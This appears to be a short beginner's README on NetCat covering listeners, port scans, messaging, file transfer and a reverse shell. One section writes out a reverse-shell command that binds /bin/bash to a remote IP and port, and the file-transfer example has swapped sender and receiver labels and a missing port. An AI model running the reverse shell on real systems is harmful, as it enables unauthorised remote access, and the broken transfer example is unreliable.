# NETCAT

## What is NetCat
NetCat (NC) is a powerful network tool used for:
- Sending & Receeiving data over networks
- Scanning Ports
- Creating Reverse Shells
- File Transfer and Mores

Common in penetration testing and cybersecurity labs.

## Basic NetCat command structure
NC [OPTIONS] [IPADDESS] [PORT]

#### Example
    NC 192.168.1.1 80

    This connect to port 80 of the given IP.

## Set Up a Listener
Create a Listener on a port:
    NC -LVP 4444

    - L = LISTEN MODE
    - V = VERBOSE 
    - P = PORT

    Use this to receive data or connections.

## Scan open ports on a Target
Port scanning with NETCAT:
    NC -ZV 192.168.1.1-1000

    - Z = NO DATA TRANSFER
    - V = VERBOSE OUTPUT

Find open ports quickly.

## Send a message to a listening port
Send Data Using NETCAT:
    ECHO "HELLO FROM WORKSPACE" | NC 192.168.1.2 4444

Test how data is transmitted between system!

## Transfer file with NetCat
SEND FILE (SENDER)
    NC -LVP 4444 > RECEIVED.TXT
RECEIVE FILE (RECEIVER):
    NC 192.168.1.2 < FILE.TXT

Super easy way to transfer file in LAN.

## Create a simple reverse sheel
For education testing only
    NC -E /BIN/BASH 192.168.1.2 4444

Create a shell connection from victim to attrack machine. Only use in LAB/TESTING Environment with permission.

## Usecases in CyberSecurity 
- Port scanning
- Backdoor testing
- Remote Access
- File Transfer in CFTS
- Testing firewall rules

Very useful in ethical hacking and penetration testing courses.
